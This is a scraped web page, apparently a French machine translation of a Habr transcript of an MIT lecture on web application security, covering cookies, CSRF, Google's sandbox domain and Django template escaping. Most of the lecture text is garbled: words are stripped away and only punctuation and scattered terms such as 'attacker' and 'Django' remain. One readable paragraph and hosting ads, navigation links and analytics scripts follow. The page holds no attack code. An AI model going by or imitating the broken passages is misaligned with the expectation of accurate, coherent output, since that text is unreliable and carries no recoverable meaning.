  , ,  Ferrari,        attacker,    . <br><br><img src="https://habrastorage.org/webt/3q/nz/v2/3qnzv2vakvuorhnvqzgzonxubvw.jpeg"><br><br>    ,  JavaScript,      cookie,  ,       URL-.  ,     CSRF ,      . <br><br>   ,     ,      ,   .    ,         ,    . ,  -   ,   ,     ,  Google, Office 365   .         . , Google              googleusercontent.com.      ,  Gmail   . -,      25-   . <br><br><img src="https://habrastorage.org/webt/xz/b0/r7/xzb0r7kx8ebddto0pynf4cuoyn4.jpeg"><br><br>       ?  ,          -     ,              google.com.     ,              google.com.          . <br><br>  ,     â€“     .   ,       -,    ,     .       ,                 .   â€”   Django.   -, ,          -. <br><br><img src="https://habrastorage.org/webt/hh/tk/em/hhtkemhitqft99764mtwlvwzssi.jpeg"><br><br> Django     ,      ,           .          â€“   .             CSS   ,       . ,        .  Django    ,    :   ,   . <br><br><img src="https://habrastorage.org/webt/m7/t-/tt/m7t-tthgw-nmrsbhzx0z0r_8wwi.jpeg"><br><br>    -.    ,       Django,  Django : Â«,     -, ,  ,    CGIÂ».    Django     ,       ,     .  -   CGI0,    ,         . <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cependant, Django fait beaucoup mieux - il dÃ©sinfecte le contenu utilisateur, car il attend de lui une astuce. </font><font style="vertical-align: inherit;">Il place simplement immÃ©diatement la valeur de la variable de nom ici, et l'encode de telle maniÃ¨re que ce contenu ne puisse jamais sortir du contexte HTML et exÃ©cuter du code JavaScript ou quelque chose comme Ã§a. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26:25 min</font></font><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Cours MIT "SÃ©curitÃ© des systÃ¨mes informatiques".</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ConfÃ©rence 9: Â«SÃ©curitÃ© des applications WebÂ», partie 2</a> <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/6HhmIlbE0l0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  La version complÃ¨te du cours est disponible <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br><br>  Merci de rester avec nous.  Aimez-vous nos articles?  Vous voulez voir des matÃ©riaux plus intÃ©ressants?  Soutenez-nous en passant une commande ou en le recommandant Ã  vos amis, une <b>rÃ©duction de 30% pour les utilisateurs Habr sur un analogue unique de serveurs d'entrÃ©e de gamme que nous avons inventÃ©s pour vous:</b> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Toute la vÃ©ritÃ© sur VPS (KVM) E5-2650 v4 (6 cÅ“urs) 10 Go DDR4 240 Go SSD 1 Gbps Ã  partir de 20 $ ou comment diviser le serveur?</a>  (les options sont disponibles avec RAID1 et RAID10, jusqu'Ã  24 cÅ“urs et jusqu'Ã  40 Go de DDR4). <br><br>  <b>VPS (KVM) E5-2650 v4 (6 cÅ“urs) 10 Go DDR4 240 Go SSD 1 Gbit / s jusqu'en dÃ©cembre gratuitement</b> en payant pour une pÃ©riode de six mois, vous pouvez commander <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br><br>  <b>Dell R730xd 2 fois moins cher?</b>  Nous avons seulement <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">2 x Intel Dodeca-Core Xeon E5-2650v4 128 Go DDR4 6x480 Go SSD 1 Gbps 100 TV Ã  partir de 249 $</a> aux Pays-Bas et aux Ã‰tats-Unis!</b>  Pour en savoir plus sur la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">crÃ©ation d'un bÃ¢timent d'infrastructure.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">classe utilisant des serveurs Dell R730xd E5-2650 v4 coÃ»tant 9 000 euros pour un sou?</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr424289/">https://habr.com/ru/post/fr424289/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr424275/index.html">L'Ã©nergie dans la cellule. Utilisation et stockage</a></li>
<li><a href="../fr424277/index.html">L'Ã©migration et tout ce qu'elle contient dans les blogs de tÃ©lÃ©grammes</a></li>
<li><a href="../fr424279/index.html">Comment ouvrir une adresse IP en Allemagne, si vous Ãªtes programmeur et ne pas remplir de cÃ´nes</a></li>
<li><a href="../fr424285/index.html">Conseils de dÃ©marrage Y Combinator: DÃ©velopper des marchÃ©s de jouets</a></li>
<li><a href="../fr424287/index.html">Comment nous avons participÃ© Ã  InnovateFPGA 2018 et n'avons pas gagnÃ© Ã  nouveau</a></li>
<li><a href="../fr424295/index.html">Cours MIT "SÃ©curitÃ© des systÃ¨mes informatiques". ConfÃ©rence 9: Â«SÃ©curitÃ© des applications WebÂ», partie 2</a></li>
<li><a href="../fr424297/index.html">Cours MIT "SÃ©curitÃ© des systÃ¨mes informatiques". ConfÃ©rence 9: SÃ©curitÃ© des applications Web, partie 3</a></li>
<li><a href="../fr424301/index.html">Algorithme de filtre d'image de rÃ©seau neuronal adaptatif</a></li>
<li><a href="../fr424305/index.html">RIB pour architecture mobile multiplateforme Uber</a></li>
<li><a href="../fr424307/index.html">GitLab 11.3 publiÃ© avec le rÃ©fÃ©rentiel Maven et les environnements sÃ©curisÃ©s</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>